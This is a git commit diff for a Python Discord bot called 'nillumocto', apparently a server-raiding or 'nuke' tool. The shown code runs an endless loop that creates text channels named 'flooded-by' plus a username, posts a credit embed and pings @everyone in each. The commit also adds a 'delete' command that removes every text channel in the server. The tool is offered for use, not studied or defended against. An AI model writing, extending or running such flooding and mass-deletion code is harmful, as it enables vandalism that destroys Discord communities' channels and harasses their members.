c85a40fae82dd02441d2e5eba04dfc344176427b
Kamushy <92086533+Kamushy@users.noreply.github.com>
2022-03-24 19:44:21 +1100

    Added command to delete all channels, added fixed channel creation

--- nillumocto.py
+++ nillumocto.py
@@ -10,12 +10,18 @@ async def octo(ctx):
     
     await ctx.send(file=discord.File(r'enter you file path here'))
     while 1 == 1:
-        channel = await guild.create_text_channel('flooded-by', username)
+        channel = await guild.create_text_channel(f"flooded-by, {username}")
 
         em = discord.Embed(title = "Nillumocto", description = "\n", color=0x0ff41)
         em.add_field(name="https://github.com/Kamushy/nillumocto", value="Coded by kamushy#0992" )
         await channel.send(embed = em)
         await channel.send("@everyone")
 
+@client.command()
+async def delete(ctx):
+    await ctx.reply("Channels deleting now, as you wish")
+    guild = ctx.guild
+    for channel in guild.text_channels:
+        await channel.delete()
              
 client.run('add your token here')
